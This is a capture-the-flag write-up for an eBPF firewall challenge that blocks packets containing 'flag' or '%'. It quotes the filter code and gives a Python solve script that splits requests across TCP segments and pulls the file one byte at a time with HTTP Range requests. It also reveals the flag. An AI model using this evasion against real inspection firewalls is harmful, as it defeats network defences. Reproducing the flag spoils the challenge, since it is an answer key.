## Overview

This challenge presents an eBPF-based network firewall that inspects packet payloads at the kernel level. The goal is to retrieve the flag from `/flag.html` on an nginx server, but the firewall blocks any packets containing specific patterns.

| Category | Difficulty | Flag |
|----------|------------|------|
| Web/Network | Easy | `uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}` |

---

## Source Code Analysis

### The eBPF Firewall (`firewall.c`)

The firewall is implemented as a TC (Traffic Control) eBPF program attached to both ingress and egress on `eth0`:

```c
static const char blocked_kw[KW_LEN] = "flag";
static const char blocked_char = '%';
```

### Key Filtering Logic

| Filter | Purpose |
|--------|---------|
| **Keyword Blocking** (`has_blocked_kw`) | Scans TCP payload for the 4-byte string "flag" |
| **Character Blocking** (`has_blocked_char`) | Scans for `%` to prevent URL encoding tricks like `%66lag` |
| **Fragment Blocking** | Drops IP fragments to prevent fragmentation attacks |

**Fragment Check:**

```c
if (iph->frag_off & bpf_htons(IP_MF | IP_OFFSET)) {
    return TC_ACT_SHOT;
}
```

**Bidirectional Filtering** (from `entrypoint.sh`):

```bash
tc filter add dev eth0 ingress bpf da obj /src/firewall.o sec tc/ingress
tc filter add dev eth0 egress bpf da obj /src/firewall.o sec tc/ingress
```

> [!IMPORTANT]
> The same filter is applied to **both ingress AND egress** traffic, meaning requests AND responses are inspected.

---

## The Vulnerability

The critical insight is that **eBPF inspects individual packets, not reassembled TCP streams**. The firewall checks each packet independently:

```mermaid
flowchart LR
    A["Packet 1: 'GET /fl'"] --> B{Contains 'flag'?}
    B -->|No| C[PASS ✓]
    D["Packet 2: 'ag.html...'"] --> E{Contains 'flag'?}
    E -->|No| F[PASS ✓]
```



- If "flag" is split across two TCP segments → neither packet contains "flag" → both pass
- If the response body is sent byte-by-byte → no single packet contains "flag" → all pass

---

## Exploitation Strategy

### Bypass #1: TCP Segmentation (Request Filter)

Split the HTTP request across multiple TCP segments using socket-level control:

```python
# Packet 1: "GET /fl" (no "flag" keyword)
s.send(b"GET /fl")
time.sleep(0.05)  # Force packet boundary

# Packet 2: "ag.html HTTP/1.1\r\n..."
s.send(payload.encode())
```

The kernel sends these as separate packets. Neither contains "flag", so both pass the ingress filter.

### Bypass #2: HTTP Range Headers (Response Filter)

The response `<h1>Here is your free flag: uoftctf{...}</h1>` would be blocked on egress. However, we can use **HTTP Range requests** to fetch the file one byte at a time:

```http
GET /flag.html HTTP/1.1
Host: target
Range: bytes=0-0
```

Each response contains only a single byte, so no packet ever contains the full "flag" string.

---

## Complete Exploit Flow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant S as Server
    A->>S: TCP: "GET /fl"
    Note right of S: ✓ Passes (no "flag")
    A->>S: TCP: "ag.html...Range: bytes=0-0"
    Note right of S: ✓ Passes (no "flag")
    S->>A: TCP: "206 Partial Content" + 1 byte
    Note left of A: ✓ Passes (1 byte body)
    loop Repeat for each byte offset
        A->>S: Range request for next byte
        S->>A: Single byte response
    end
```



---

## Solution Script

The `solve.py` implements this attack:

```python
import socket
import time

HOST = "target.chals.uoftctf.org"
PORT = 80

def get_flag_byte(offset):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Split "flag" across TCP segments
    s.send(b"GET /fl")
    time.sleep(0.05)
    
    # Request single byte via Range header
    payload = f"ag.html HTTP/1.1\r\nHost: {HOST}\r\nRange: bytes={offset}-{offset}\r\n\r\n"
    s.send(payload.encode())
    
    response = s.recv(4096).decode()
    s.close()
    
    # Parse the single byte from response body
    if "206" in response:
        return response.split("\r\n\r\n")[1]
    return None

# Reconstruct the file byte by byte
flag = ""
offset = 0
while True:
    byte = get_flag_byte(offset)
    if byte is None:
        break
    flag += byte
    offset += 1

print(flag)
```

The script loops through each byte offset until it receives a `416 Range Not Satisfiable` (end of file).

---

## Summary

| Defense Mechanism | Bypass Technique |
|-------------------|------------------|
| Keyword filter on packets | TCP segmentation splits keyword across packets |
| `%` character block | Not needed when using Range headers |
| IP fragmentation block | Use TCP segmentation instead |
| Egress filtering | HTTP Range: single-byte responses |

---

## Conclusion

This challenge demonstrates a fundamental weakness in packet-level inspection: **TCP streams can be segmented in ways that break pattern matching**. The combination of:
- 🔪 **TCP Segmentation** to bypass request filtering
- 📦 **HTTP Range Requests** to bypass response filtering

...allowed us to retrieve the flag without ever sending or receiving a packet containing the blocked keyword.

**Flag:** `uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`
